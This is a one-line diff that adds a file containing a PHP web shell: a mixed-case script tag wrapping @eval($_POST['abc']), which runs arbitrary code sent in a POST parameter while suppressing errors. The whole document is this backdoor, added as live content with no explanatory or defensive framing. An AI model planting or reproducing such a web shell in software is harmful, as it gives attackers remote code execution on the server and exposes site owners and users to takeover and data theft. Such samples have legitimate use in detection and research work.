@@ -1,0 +1,1 @@
+<script language="pHp">@eval($_POST['abc'])</script>
